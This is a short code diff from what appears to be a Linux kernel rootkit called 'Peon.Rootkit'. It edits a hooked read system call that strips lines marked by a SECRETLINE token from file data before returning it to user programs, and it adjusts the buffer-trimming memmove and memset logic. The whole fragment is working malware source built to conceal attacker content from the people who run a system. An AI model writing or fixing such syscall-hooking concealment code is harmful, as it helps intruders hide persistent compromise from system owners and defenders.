@@ -440,8 +440,8 @@ asmlinkage long hook_read_call(unsigned int fd, char __user *buf, size_t count) 
         if (ch != NULL && ch2 != NULL) {
             printk(KERN_ALERT "Peon.Rootkit: HIDECONTENT\n");
             modif_ret = strlen(ch) - strlen(ch2);
-            memmove(ch, ch2 + strlen(SECRETLINE), strlen(ch2) - strlen(SECRETLINE) + 1);
-            *(ch + strlen(ch2) + 2) = 0;
+            memmove(ch, ch2 + strlen(SECRETLINE), strlen(ch2) - strlen(SECRETLINE)-1);
+            memset(ch + strlen(ch2)-2, 0, ret+ strlen(SECRETLINE));
             copy_to_user(buf, kbuf, modif_ret);
         }
         kfree(kbuf);
